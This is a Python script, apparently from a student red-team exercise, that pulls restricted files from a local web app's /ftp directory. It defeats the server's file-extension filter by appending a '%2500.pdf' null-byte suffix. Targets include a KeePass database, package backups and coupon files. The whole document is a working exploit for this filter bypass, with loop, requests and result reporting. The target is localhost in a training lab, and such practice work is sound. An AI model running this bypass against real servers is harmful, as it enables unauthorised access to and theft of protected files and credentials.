#!/usr/bin/env python3
"""
FTP File Download Bypass Script - Null Byte Technique (%2500.pdf)
This script downloads files from the FTP directory using URL encoding 
to bypass the file extension filter on the server.
"""

import requests
import os
import sys
from pathlib import Path

# Configuration
TARGET_URL = "http://127.0.0.1:3000"
FTP_DIR = "/ftp"
OUTPUT_DIR = "/home/sellak/Desktop/M1/U2/M1PPAW/Red_Teams_VS_Blue_Teams/red-team/reports/exposed_files_ftp"

# List of files to download
FTP_FILES = [
    "quarantine",
    "acquisitions.md",
    "announcement_encrypted.md",
    "coupons_2013.md.bak",
    "eastere.gg",
    "encrypt.pyc",
    "incident-support.kdbx",
    "legal.md",
    "package-lock.json.bak",
    "package.json.bak",
    "suspicious_errors.yml",
]

def create_output_dir():
    """Create output directory if it doesn't exist"""
    Path(OUTPUT_DIR).mkdir(parents=True, exist_ok=True)
    print(f"[+] Output directory: {OUTPUT_DIR}")

def download_file_bypass(filename):
    """
    Download file using null byte bypass technique
    The %2500.pdf appends %25 (URL-encoded %) with 00.pdf
    When decoded, this becomes %00.pdf, causing null-byte truncation
    The server sees it as a .pdf file but extracts the original content
    """
    # Use the bypass: append %2500.pdf to the filename
    bypass_filename = f"{filename}%2500.pdf"
    url = f"{TARGET_URL}{FTP_DIR}/{bypass_filename}"
    
    output_path = os.path.join(OUTPUT_DIR, filename)
    
    try:
        print(f"\n[*] Downloading: {filename}")
        print(f"    URL: {url}")
        
        response = requests.get(url, timeout=10)
        
        if response.status_code == 200:
            with open(output_path, 'wb') as f:
                f.write(response.content)
            print(f"    [✓] Success! Saved to: {output_path}")
            print(f"    [✓] Size: {len(response.content)} bytes")
            return True
        else:
            print(f"    [✗] Failed! Status code: {response.status_code}")
            return False
            
    except requests.exceptions.RequestException as e:
        print(f"    [✗] Error: {str(e)}")
        return False

def main():
    print("=" * 70)
    print("FTP File Download Bypass Script - Null Byte Technique")
    print("=" * 70)
    
    create_output_dir()
    
    successful = 0
    failed = 0
    
    print(f"\n[*] Starting downloads from {TARGET_URL}{FTP_DIR}")
    print(f"[*] Using null byte bypass technique: %2500.pdf")
    print(f"[*] Total files to download: {len(FTP_FILES)}\n")
    
    for filename in FTP_FILES:
        if download_file_bypass(filename):
            successful += 1
        else:
            failed += 1
    
    print("\n" + "=" * 70)
    print(f"[*] Download Summary")
    print(f"    [✓] Successful: {successful}/{len(FTP_FILES)}")
    print(f"    [✗] Failed: {failed}/{len(FTP_FILES)}")
    print("=" * 70)
    
    return 0 if failed == 0 else 1

if __name__ == "__main__":
    sys.exit(main())
